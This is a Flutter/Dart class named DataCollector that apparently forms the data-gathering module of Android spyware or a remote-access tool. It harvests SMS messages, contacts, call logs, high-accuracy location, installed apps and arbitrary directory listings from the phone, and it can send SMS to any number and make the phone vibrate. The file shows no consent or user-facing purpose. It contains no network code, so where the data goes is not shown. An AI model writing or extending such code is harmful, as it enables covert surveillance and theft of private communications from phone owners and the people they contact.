import 'dart:io';
import 'package:geolocator/geolocator.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:sms_advanced/sms_advanced.dart';
import 'package:call_log/call_log.dart';
import 'package:installed_apps/installed_apps.dart';
import 'package:flutter/services.dart';

class DataCollector {
  final SmsQuery _smsQuery = SmsQuery();

  Future<List<Map<String, dynamic>>> getSMS() async {
    try {
      final messages = await _smsQuery.querySms(
        kinds: [SmsQueryKind.inbox, SmsQueryKind.sent],
        count: 100,
      );

      return messages.map((msg) => {
        'sender': msg.address ?? 'Unknown',
        'body': msg.body ?? '',
        'time': msg.date?.toString() ?? '',
        'type': msg.kind == SmsMessageKind.received ? 'inbox' : 'sent',
      }).toList();
    } catch (e) {
      print('[DATA] SMS error: $e');
      return [];
    }
  }

  Future<List<Map<String, dynamic>>> getContacts() async {
    try {
      final contacts = await ContactsService.getContacts();
      return contacts.map((contact) => {
        'name': contact.displayName ?? 'Unknown',
        'phone': contact.phones?.isNotEmpty == true 
          ? contact.phones!.first.value ?? 'N/A'
          : 'N/A',
      }).toList();
    } catch (e) {
      print('[DATA] Contacts error: $e');
      return [];
    }
  }

  Future<List<Map<String, dynamic>>> getCallLogs() async {
    try {
      final entries = await CallLog.get();
      return entries.map((call) => {
        'number': call.number ?? 'Unknown',
        'type': _getCallType(call.callType),
        'duration': call.duration ?? 0,
        'date': DateTime.fromMillisecondsSinceEpoch(call.timestamp ?? 0).toString(),
      }).toList();
    } catch (e) {
      print('[DATA] Call logs error: $e');
      return [];
    }
  }

  String _getCallType(CallType? type) {
    switch (type) {
      case CallType.incoming:
        return 'incoming';
      case CallType.outgoing:
        return 'outgoing';
      case CallType.missed:
        return 'missed';
      default:
        return 'unknown';
    }
  }

  Future<Map<String, double>?> getLocation() async {
    try {
      final position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      );
      return {
        'lat': position.latitude,
        'lng': position.longitude,
        'accuracy': position.accuracy,
      };
    } catch (e) {
      print('[DATA] Location error: $e');
      return null;
    }
  }

  Future<List<Map<String, dynamic>>> getInstalledApps() async {
    try {
      final apps = await InstalledApps.getInstalledApps(true, true);
      return apps.map((app) => {
        'name': app.name,
        'package': app.packageName,
      }).toList();
    } catch (e) {
      print('[DATA] Apps error: $e');
      return [];
    }
  }

  Future<List<Map<String, dynamic>>> getFiles(String path) async {
    try {
      final dir = Directory(path);
      if (!await dir.exists()) return [];

      final entities = await dir.list().toList();
      return entities.map((entity) {
        final stat = entity.statSync();
        return {
          'name': entity.path.split('/').last,
          'path': entity.path,
          'size': stat.size,
          'type': entity is File ? 'file' : 'directory',
        };
      }).toList();
    } catch (e) {
      print('[DATA] Files error: $e');
      return [];
    }
  }

  Future<Map<String, dynamic>> sendSMS(String number, String message) async {
    try {
      final SmsSender sender = SmsSender();
      await sender.sendSms(SmsMessage(number, message));
      return {'success': true};
    } catch (e) {
      return {'success': false, 'error': e.toString()};
    }
  }

  Future<void> vibrate() async {
    try {
      await HapticFeedback.heavyImpact();
    } catch (e) {
      print('[DATA] Vibrate error: $e');
    }
  }
}
